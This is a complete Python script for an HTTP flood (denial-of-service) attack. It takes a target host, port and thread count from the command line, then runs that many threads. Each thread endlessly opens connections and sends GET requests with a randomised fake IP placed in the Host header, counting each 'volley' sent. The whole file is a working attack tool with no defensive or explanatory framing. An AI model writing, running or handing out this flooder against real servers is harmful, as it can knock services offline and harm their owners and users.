import sys
import socket
import threading
import random
import struct

if sys.argv[1] == "-h":
  print("Arg1: Target Url\nArg2: Port\nArg3: Number of Threads\n")

else:
  host = sys.argv[1]
  port = int(sys.argv[2])
  threadNum = int(sys.argv[3])
  num = 0
  def attack():
     while True:
        fake_ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.sendto((f"GET /{host} HTTP/1.1\r\n").encode('ascii'), (host, port))
        s.sendto((f"Host: {fake_ip}\r\n\r\n").encode('ascii'), (host, port))
        s.close()
        global num
        num +=1
        print(f'{num}. voly sent!')
  
  for i in range(threadNum):
    t = threading.Thread(target=attack)
    t.start()

